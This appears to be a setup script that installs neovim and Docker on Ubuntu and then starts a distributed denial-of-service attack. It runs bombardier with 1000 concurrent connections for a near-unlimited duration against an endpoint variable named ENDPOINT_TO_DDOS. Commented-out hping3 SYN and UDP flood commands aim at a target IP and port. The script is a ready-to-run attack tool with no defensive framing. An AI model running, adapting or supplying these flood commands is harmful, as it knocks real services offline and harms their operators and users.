#!/usr/bin/env sh

apt-get update -y
apt-get install -y \
  neovim \
  ca-certificates \
  curl \
  gnupg \
  lsb-release

curl -fsSL https://download.docker.com/linux/ubuntu/gpg | gpg --dearmor -o /usr/share/keyrings/docker-archive-keyring.gpg

echo \
  "deb [arch=$(dpkg --print-architecture) signed-by=/usr/share/keyrings/docker-archive-keyring.gpg] https://download.docker.com/linux/ubuntu \
  $(lsb_release -cs) stable" | tee /etc/apt/sources.list.d/docker.list > /dev/null

apt-get update -y
apt-get install docker-ce docker-ce-cli containerd.io -y

docker run -d --rm alpine/bombardier -c 1000 -d 600000h -l "${ENDPOINT_TO_DDOS}"
# docker run -d --rm utkudarilmaz/hping3:latest -S --flood -p ${PORT_TO_DDOS} ${IP_TO_DDOS} -d 10000
# docker run -d --rm utkudarilmaz/hping3:latest -S --flood -p ${PORT_TO_DDOS} ${IP_TO_DDOS} -d 10000 --udp
